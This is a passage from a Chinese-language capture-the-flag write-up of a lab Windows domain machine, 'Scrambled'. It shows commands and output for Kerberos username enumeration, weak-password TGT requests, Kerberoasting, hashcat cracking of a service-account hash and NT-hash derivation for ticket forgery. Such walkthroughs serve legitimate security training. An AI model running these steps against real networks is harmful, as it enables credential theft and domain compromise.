+</span></span></code></pre></div><h2 id=tgt-探索>TGT 探索</h2><p>kerbrute 走 88 端口做用户名枚举，<code>ksimpson@scrm.local</code> 确认有效。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ ./kerbrute_linux_amd64 userenum -d scrm.local --dc DC1.scrm.local Users/users
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    __             __               __
+</span></span><span style=display:flex><span>   / /_____  _____/ /_  _______  __/ /____
+</span></span><span style=display:flex><span>  / //_/ _ <span style=color:#ae81ff>\/</span> ___/ __ <span style=color:#ae81ff>\/</span> ___/ / / / __/ _ <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style=display:flex><span>/_/|_|<span style=color:#ae81ff>\_</span>__/_/  /_.___/_/   <span style=color:#ae81ff>\_</span>_,_/<span style=color:#ae81ff>\_</span>_/<span style=color:#ae81ff>\_</span>__/
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Version: dev <span style=color:#f92672>(</span>9cfb81e<span style=color:#f92672>)</span> - 08/31/26 - Ronnie Flathers @ropnop
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2026/08/31 22:37:01 &gt;  Using KDC<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>2026/08/31 22:37:01 &gt;  	DC1.scrm.local:88
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2026/08/31 22:37:01 &gt;  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> VALID USERNAME:	 ksimpson@scrm.local
+</span></span><span style=display:flex><span>2026/08/31 22:37:01 &gt;  Done! Tested <span style=color:#ae81ff>1</span> usernames <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> valid<span style=color:#f92672>)</span> in 0.107 seconds
+</span></span></code></pre></div><p>既然密码重置提示"密码=用户名"，直接拿 <code>ksimpson:ksimpson</code> 申请 TGT —— 一次成功，弱口令真实存在。</p><p>顺手检查 AS-REP Roasting：ksimpson 没开 <code>UF_DONT_REQUIRE_PREAUTH</code>，这条路不通，但 TGT 已经到手。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ impacket-getTGT scrm.local/ksimpson:ksimpson -dc-ip 10.129.33.76
+</span></span><span style=display:flex><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Saving ticket in ksimpson.ccache
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ impacket-GetNPUsers -no-pass scrm.local/ksimpson -dc-ip 10.129.33.76
+</span></span><span style=display:flex><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Getting TGT <span style=color:#66d9ef>for</span> ksimpson
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> User ksimpson doesn<span style=color:#960050;background-color:#1e0010>&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></code></pre></div><p>把票据导进环境变量，后面所有 <code>-k</code>（Kerberos-only）认证都靠它。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ export KRB5CCNAME<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>pwd<span style=color:#66d9ef>)</span>/ksimpson.ccache
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ klist
+</span></span><span style=display:flex><span>Ticket cache: FILE:/home/kali/Work/Kali/Scrambled/ksimpson.ccache
+</span></span><span style=display:flex><span>Default principal: ksimpson@SCRM.LOCAL
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Valid starting       Expires              Service principal
+</span></span><span style=display:flex><span>08/31/2026 22:39:30  09/01/2026 08:39:30  krbtgt/SCRM.LOCAL@SCRM.LOCAL
+</span></span><span style=display:flex><span>	renew <span style=color:#66d9ef>until</span> 09/01/2026 22:40:11
+</span></span></code></pre></div><p>以 ksimpson 的身份用 Kerberos 列共享。<code>IT</code> / <code>Sales</code> / <code>HR</code> 全部 ACCESS_DENIED，只有 <code>Public</code> 能读，里面有一份 PDF <code>Network Security Changes.pdf</code>。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ impacket-smbclient -k -no-pass SCRM.LOCAL/ksimpson@DC1.scrm.local
+</span></span><span style=display:flex><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Type help <span style=color:#66d9ef>for</span> list of commands
+</span></span><span style=display:flex><span><span style=color:#75715e># shares</span>
+</span></span><span style=display:flex><span>ADMIN$
+</span></span><span style=display:flex><span>C$
+</span></span><span style=display:flex><span>HR
+</span></span><span style=display:flex><span>IPC$
+</span></span><span style=display:flex><span>IT
+</span></span><span style=display:flex><span>NETLOGON
+</span></span><span style=display:flex><span>Public
+</span></span><span style=display:flex><span>Sales
+</span></span><span style=display:flex><span>SYSVOL
+</span></span><span style=display:flex><span><span style=color:#75715e># use IT</span>
+</span></span><span style=display:flex><span>ls
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - <span style=color:#f92672>{</span>Access Denied<span style=color:#f92672>}</span> A process has requested access to an object but has not been granted those access rights.
+</span></span><span style=display:flex><span><span style=color:#75715e># ls</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - <span style=color:#f92672>{</span>Access Denied<span style=color:#f92672>}</span> A process has requested access to an object but has not been granted those access rights.
+</span></span><span style=display:flex><span><span style=color:#75715e># use Sales</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - <span style=color:#f92672>{</span>Access Denied<span style=color:#f92672>}</span> A process has requested access to an object but has not been granted those access rights.
+</span></span><span style=display:flex><span><span style=color:#75715e># use HR</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - <span style=color:#f92672>{</span>Access Denied<span style=color:#f92672>}</span> A process has requested access to an object but has not been granted those access rights.
+</span></span><span style=display:flex><span><span style=color:#75715e># use Public</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># ls</span>
+</span></span><span style=display:flex><span>drw-rw-rw-          <span style=color:#ae81ff>0</span>  Thu Nov  <span style=color:#ae81ff>4</span> 18:23:19 <span style=color:#ae81ff>2021</span> .
+</span></span><span style=display:flex><span>drw-rw-rw-          <span style=color:#ae81ff>0</span>  Thu Nov  <span style=color:#ae81ff>4</span> 18:23:19 <span style=color:#ae81ff>2021</span> ..
+</span></span><span style=display:flex><span>-rw-rw-rw-     <span style=color:#ae81ff>630106</span>  Fri Nov  <span style=color:#ae81ff>5</span> 13:45:07 <span style=color:#ae81ff>2021</span> Network Security Changes.pdf
+</span></span><span style=display:flex><span><span style=color:#75715e># get Network Security Changes.pdf</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Traceback (most recent call last):</span>
+</span></span></code></pre></div><p>下载下来。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ ls -liah Network<span style=color:#ae81ff>\ </span>Security<span style=color:#ae81ff>\ </span>Changes.pdf
+</span></span><span style=display:flex><span><span style=color:#ae81ff>2793088</span> -rw-rw-r-- <span style=color:#ae81ff>1</span> kali kali 616K Aug <span style=color:#ae81ff>31</span> 22:54 <span style=color:#e6db74>&#39;Network Security Changes.pdf&#39;</span>
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ file Network<span style=color:#ae81ff>\ </span>Security<span style=color:#ae81ff>\ </span>Changes.pdf
+</span></span><span style=display:flex><span>Network Security Changes.pdf: PDF document, version 1.5, <span style=color:#ae81ff>1</span> page<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>zip deflate encoded<span style=color:#f92672>)</span>
+</span></span></code></pre></div><ul><li><strong>NTLM 全网禁用</strong>，所有人改用 Kerberos —— 所以这一局所有工具都得带 <code>-k</code> 走 Kerberos-only 认证，relay 路线彻底封死；</li><li><strong>SQL 服务只留给管理员</strong>，HR 软件连不上库了 —— 反过来说，公告自己承认"攻击者当年就是从 HR 软件的 SQL 库里拿到的凭据"，谁要是能进 SQL，就能捡到别人留下的凭据。</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Scramble Corp
+</span></span><span style=display:flex><span>ADDITIONAL SECURITY MEASURES
+</span></span><span style=display:flex><span>Date: 04/09/2021
+</span></span><span style=display:flex><span>FAO: All employees
+</span></span><span style=display:flex><span>Author: IT Support
+</span></span><span style=display:flex><span>As you may have heard, our network was recently compromised and an attacker was able to access
+</span></span><span style=display:flex><span>all of our data. We have identified the way the attacker was able to gain access and have made some
+</span></span><span style=display:flex><span>immediate changes. You can find these listed below along with the ways these changes may impact
+</span></span><span style=display:flex><span>you.
+</span></span><span style=display:flex><span>Change: As the attacker used something known as <span style=color:#e6db74>&#34;NTLM relaying&#34;</span>, we have disabled NTLM
+</span></span><span style=display:flex><span>authentication across the entire network.
+</span></span><span style=display:flex><span>Users impacted: All
+</span></span><span style=display:flex><span>Workaround: When you log on or access network resources you will now be using Kerberos
+</span></span><span style=display:flex><span>authentication <span style=color:#f92672>(</span>which is definitely 100% secure and has absolutely no way anyone could exploit it<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>This will require you to use the full domain name <span style=color:#f92672>(</span>scrm.local<span style=color:#f92672>)</span> with your username and any server
+</span></span><span style=display:flex><span>names you access.
+</span></span><span style=display:flex><span>Change: The attacker was able to retrieve credentials from an SQL database used by our HR software
+</span></span><span style=display:flex><span>so we have removed all access to the SQL service <span style=color:#66d9ef>for</span> everyone apart from network administrators.
+</span></span><span style=display:flex><span>Users impacted: HR department
+</span></span><span style=display:flex><span>Workaround: If you can no longer access the HR software please contact us and we will manually
+</span></span><span style=display:flex><span>grant your account access again.
+</span></span></code></pre></div><p>因为 NTLM 被禁，<code>-k</code> 走 Kerberos、<code>-dc-host</code> 直接指定 KDC，<code>-request</code> 把 TGS 一起拉回来。域里只有一个服务账号 <code>sqlsvc</code>，挂着两条 <code>MSSQLSvc</code> 的 SPN，返回的是 <code>$krb5tgs$23$</code> 开头的 RC4 hash，正是 hashcat 爱吃的格式。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ impacket-GetUserSPNs -k -no-pass -dc-host DC1.scrm.local SCRM.LOCAL/ksimpson -request
+</span></span><span style=display:flex><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
+</span></span><span style=display:flex><span>----------------------------  ------  --------  --------------------------  --------------------------  ----------
+</span></span><span style=display:flex><span>MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2026-08-31 21:51:57.170530
+</span></span><span style=display:flex><span>MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2026-08-31 21:51:57.170530
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$krb5tgs$23$*sqlsvc$SCRM.LOCAL$SCRM.LOCAL/sqlsvc*$8a4d97242530b754ec14f9e4cfe8e699$237cc207ded7c73b131c94a4ab2e6c87b09a093915c9754d9fc6e4f2c96a607b4a82168cff47aa7d0a557ac17a07a3f5986389d27dd7874bacd8ff39155b6e97e2845a9aa05779e3c9c20fe4bc7f901f4fe1fd6fd23da6a3c45c2bb6f4de3b909cf71e3ae7b4118e1f9238b2332fefda53a659fe1a7cab75ef2f619dfad9ed2eee76f2e77d992938601da88bf8f75caa4ed9437f5f1f5ac96439038490b4c5a1cac3980dcfd63a90a88f1990295ec7c2ee7468d86b72c36286c84c005a748eccf7ede8ed81011963a06217edae1dbb9c06fa04a091cd820d4eabfc9b98a9750777ab21624f9926a4eb63bc3fed0959a269c5c16eee3c1b5e55aa5da28d978af8337598124d6c2d54fb80fecba119c0c23c73598a1e6c7dc3231706253adefd980309494d7e2e633afd7702dc71e6d0806fcee769389f1f8abcc9c647bc261ef8656edcfe2d61df0f23a7434cc1da5fd352725863cb33c4397c727eda416778f856937ea87bdb42139e240260957f78d61cbb5dbe1bf1f6d09104156b0593674a242161d1797218ca19af7ee7fb60b1738e978b99f9feb4da1f71e2dd639b5bd5ef6172bbe6b5083a33215809fe7ad89d13e17bb8f202c22ebf6de15bccb7e80ada13ba508e601953b4572117f876b9a55852b161f7a4865a181a7dfb33cc6c8e999b1e1051481668e4e941fe06fdc58b38cf227e4d813dbd3004da68cae988802517033cdd96f80af857da8eb2f9933e1e16acbd5e045961511e3f81d66f27551366d9584362ac0976c0b82d917059347398701b7a00f2c398b39fec5fa109e92f4d29e8536b27cfb7ade9746118c3dcf6a9be654f87b74dcfb505a36eb05a7f6f521f61c94a44911760ffdbd00adde489fd43477dde31bf09021d2e429a2c2433ff5c514aeddea5774546beda54007d9757de6dcfd424576924cf406caa0ccb93382d671a06acfd07090b1e6064e1329f15754468a796cf0de781bf742795ac728d15c32ff1e16fc0ba274cc913e2ab1d9d8e8430a58e65d6dbdfdf84d33720b332c9f8f375e2aa48f3725f289e646964b6bc0ebe3468a2f151879c52160c4cd6fe6f83ec5da81972daf42e41f4e2acc4059fee3a8e9f0d02512667200bb9a4bc2a8e5001915b9fc6883caa482c309e1d71fe1b395aa0c5a7b5fcd14848c476897f43ee2416614afcc892832cd1946644a5936ba079565e31195792507ff679cb035fdb860198d9df76fd02d37a5d98a5dd3bf27bd863d7100dc6c08940dd4a84729b797afb915feee158c90a7cc2759b6f023ffcce34213416aa31905b6eb45afa947cd8a836fc4eee419d487e211264501b3337879c0062f823a31c28be7ad2ad286a966ee16895e494e38ea5b79cc3509265e7f3be8c97ff12b47a8d2c1038125b2933103ab0e21b68fbc642de2ba64e1a0795d9258cdee0c5
+</span></span></code></pre></div><p>破解得到凭据 <strong>sqlsvc : Pegasus60</strong>。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ sudo hashcat -m <span style=color:#ae81ff>13100</span> Users/sqlsvc_hash /usr/share/wordlists/rockyou.txt
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> kali:
+</span></span><span style=display:flex><span>hashcat <span style=color:#f92672>(</span>v7.1.2<span style=color:#f92672>)</span> starting
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>OpenCL API <span style=color:#f92672>(</span>OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG<span style=color:#f92672>)</span> - Platform <span style=color:#75715e>#1 [The pocl project]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>====================================================================================================================================================</span>
+</span></span><span style=display:flex><span>* Device <span style=color:#75715e>#01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900HX, 13929/27859 MB (4096 MB allocatable), 8MCU</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Minimum password length supported by kernel: <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>Maximum password length supported by kernel: <span style=color:#ae81ff>256</span>
+</span></span><span style=display:flex><span>Minimum salt length supported by kernel: <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>Maximum salt length supported by kernel: <span style=color:#ae81ff>256</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Hashes: <span style=color:#ae81ff>1</span> digests; <span style=color:#ae81ff>1</span> unique digests, <span style=color:#ae81ff>1</span> unique salts
+</span></span><span style=display:flex><span>Bitmaps: <span style=color:#ae81ff>16</span> bits, <span style=color:#ae81ff>65536</span> entries, 0x0000ffff mask, <span style=color:#ae81ff>262144</span> bytes, 5/13 rotates
+</span></span><span style=display:flex><span>Rules: <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Optimizers applied:
+</span></span><span style=display:flex><span>* Zero-Byte
+</span></span><span style=display:flex><span>* Not-Iterated
+</span></span><span style=display:flex><span>* Single-Hash
+</span></span><span style=display:flex><span>* Single-Salt
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ATTENTION! Pure <span style=color:#f92672>(</span>unoptimized<span style=color:#f92672>)</span> backend kernels selected.
+</span></span><span style=display:flex><span>Pure kernels can crack longer passwords, but drastically reduce performance.
+</span></span><span style=display:flex><span>If you want to switch to optimized kernels, append -O to your commandline.
+</span></span><span style=display:flex><span>See the above message to find out about the exact limits.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Watchdog: Temperature abort trigger set to 90c
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Host memory allocated <span style=color:#66d9ef>for</span> this attack: <span style=color:#ae81ff>514</span> MB <span style=color:#f92672>(</span><span style=color:#ae81ff>27328</span> MB free<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Dictionary cache hit:
+</span></span><span style=display:flex><span>* Filename..: /usr/share/wordlists/rockyou.txt
+</span></span><span style=display:flex><span>* Passwords.: <span style=color:#ae81ff>14344385</span>
+</span></span><span style=display:flex><span>* Bytes.....: <span style=color:#ae81ff>139921507</span>
+</span></span><span style=display:flex><span>* Keyspace..: <span style=color:#ae81ff>14344385</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$krb5tgs$23$*sqlsvc$SCRM.LOCAL$SCRM.LOCAL/sqlsvc*$8a4d97242530b754ec14f9e4cfe8e699$237cc207ded7c73b131c94a4ab2e6c87b09a093915c9754d9fc6e4f2c96a607b4a82168cff47aa7d0a557ac17a07a3f5986389d27dd7874bacd8ff39155b6e97e2845a9aa05779e3c9c20fe4bc7f901f4fe1fd6fd23da6a3c45c2bb6f4de3b909cf71e3ae7b4118e1f9238b2332fefda53a659fe1a7cab75ef2f619dfad9ed2eee76f2e77d992938601da88bf8f75caa4ed9437f5f1f5ac96439038490b4c5a1cac3980dcfd63a90a88f1990295ec7c2ee7468d86b72c36286c84c005a748eccf7ede8ed81011963a06217edae1dbb9c06fa04a091cd820d4eabfc9b98a9750777ab21624f9926a4eb63bc3fed0959a269c5c16eee3c1b5e55aa5da28d978af8337598124d6c2d54fb80fecba119c0c23c73598a1e6c7dc3231706253adefd980309494d7e2e633afd7702dc71e6d0806fcee769389f1f8abcc9c647bc261ef8656edcfe2d61df0f23a7434cc1da5fd352725863cb33c4397c727eda416778f856937ea87bdb42139e240260957f78d61cbb5dbe1bf1f6d09104156b0593674a242161d1797218ca19af7ee7fb60b1738e978b99f9feb4da1f71e2dd639b5bd5ef6172bbe6b5083a33215809fe7ad89d13e17bb8f202c22ebf6de15bccb7e80ada13ba508e601953b4572117f876b9a55852b161f7a4865a181a7dfb33cc6c8e999b1e1051481668e4e941fe06fdc58b38cf227e4d813dbd3004da68cae988802517033cdd96f80af857da8eb2f9933e1e16acbd5e045961511e3f81d66f27551366d9584362ac0976c0b82d917059347398701b7a00f2c398b39fec5fa109e92f4d29e8536b27cfb7ade9746118c3dcf6a9be654f87b74dcfb505a36eb05a7f6f521f61c94a44911760ffdbd00adde489fd43477dde31bf09021d2e429a2c2433ff5c514aeddea5774546beda54007d9757de6dcfd424576924cf406caa0ccb93382d671a06acfd07090b1e6064e1329f15754468a796cf0de781bf742795ac728d15c32ff1e16fc0ba274cc913e2ab1d9d8e8430a58e65d6dbdfdf84d33720b332c9f8f375e2aa48f3725f289e646964b6bc0ebe3468a2f151879c52160c4cd6fe6f83ec5da81972daf42e41f4e2acc4059fee3a8e9f0d02512667200bb9a4bc2a8e5001915b9fc6883caa482c309e1d71fe1b395aa0c5a7b5fcd14848c476897f43ee2416614afcc892832cd1946644a5936ba079565e31195792507ff679cb035fdb860198d9df76fd02d37a5d98a5dd3bf27bd863d7100dc6c08940dd4a84729b797afb915feee158c90a7cc2759b6f023ffcce34213416aa31905b6eb45afa947cd8a836fc4eee419d487e211264501b3337879c0062f823a31c28be7ad2ad286a966ee16895e494e38ea5b79cc3509265e7f3be8c97ff12b47a8d2c1038125b2933103ab0e21b68fbc642de2ba64e1a0795d9258cdee0c5:Pegasus60
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Session..........: hashcat
+</span></span><span style=display:flex><span>Status...........: Cracked
+</span></span><span style=display:flex><span>Hash.Mode........: <span style=color:#ae81ff>13100</span> <span style=color:#f92672>(</span>Kerberos 5, etype 23, TGS-REP<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Hash.Target......: $krb5tgs$23$*sqlsvc$SCRM.LOCAL$SCRM.LOCAL/sqlsvc*$8...dee0c5
+</span></span><span style=display:flex><span>Time.Started.....: Mon Aug <span style=color:#ae81ff>31</span> 23:04:19 <span style=color:#ae81ff>2026</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>3</span> secs<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Time.Estimated...: Mon Aug <span style=color:#ae81ff>31</span> 23:04:22 <span style=color:#ae81ff>2026</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>0</span> secs<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Kernel.Feature...: Pure Kernel <span style=color:#f92672>(</span>password length 0-256 bytes<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Guess.Base.......: File <span style=color:#f92672>(</span>/usr/share/wordlists/rockyou.txt<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Guess.Queue......: 1/1 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Speed.#01........:  3180.3 kH/s <span style=color:#f92672>(</span>1.48ms<span style=color:#f92672>)</span> @ Accel:1024 Loops:1 Thr:1 Vec:8
+</span></span><span style=display:flex><span>Recovered........: 1/1 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span> Digests <span style=color:#f92672>(</span>total<span style=color:#f92672>)</span>, 1/1 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span> Digests <span style=color:#f92672>(</span>new<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Progress.........: 10731520/14344385 <span style=color:#f92672>(</span>74.81%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Rejected.........: 0/10731520 <span style=color:#f92672>(</span>0.00%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Restore.Point....: 10723328/14344385 <span style=color:#f92672>(</span>74.76%<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span style=display:flex><span>Candidate.Engine.: Device Generator
+</span></span><span style=display:flex><span>Candidates.#01...: Pkan123 -&gt; Pastillez
+</span></span><span style=display:flex><span>Hardware.Mon.#01.: Util: 60%
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Started: Mon Aug <span style=color:#ae81ff>31</span> 23:04:17 <span style=color:#ae81ff>2026</span>
+</span></span><span style=display:flex><span>Stopped: Mon Aug <span style=color:#ae81ff>31</span> 23:04:24 <span style=color:#ae81ff>2026</span>
+</span></span></code></pre></div><p>将 Pegasus60 算成 NTLM hash（MD4），伪造银票要往 <code>-nthash</code> 里填。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ echo -n <span style=color:#e6db74>&#39;Pegasus60&#39;</span> | iconv -t UTF-16LE | openssl dgst -md4
+</span></span><span style=display:flex><span>MD4<span style=color:#f92672>(</span>stdin<span style=color:#f92672>)=</span> b999a16500b87d17ec7f2e2a68778f05
+</span></span></code></pre></div><p>用 sqlsvc 的新凭据申请 TGT，正式接管这个服务账号的身份。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ export KRB5CCNAME<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>pwd<span style=color:#66d9ef>)</span>/sqlsvc.ccache
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ impacket-getTGT scrm.local/sqlsvc:Pegasus60 -dc-ip 10.129.33.76
+</span></span><span style=display:flex><span>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Saving ticket in sqlsvc.ccache
+</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Work/Kali/Scrambled<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>└─$ klist
+</span></span><span style=display:flex><span>Ticket cache: FILE:/home/kali/Work/Kali/Scrambled/sqlsvc.ccache
+</span></span><span style=display:flex><span>Default principal: sqlsvc@SCRM.LOCAL
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Valid starting       Expires              Service principal
+</span></span><span style=display:flex><span>08/31/2026 23:18:57  09/01/2026 09:18:57  krbtgt/SCRM.LOCAL@SCRM.LOCAL
+</span></span><span style=display:flex><span>	renew <span style=color:#66d9ef>until</span> 09/01/2026 23:19:38
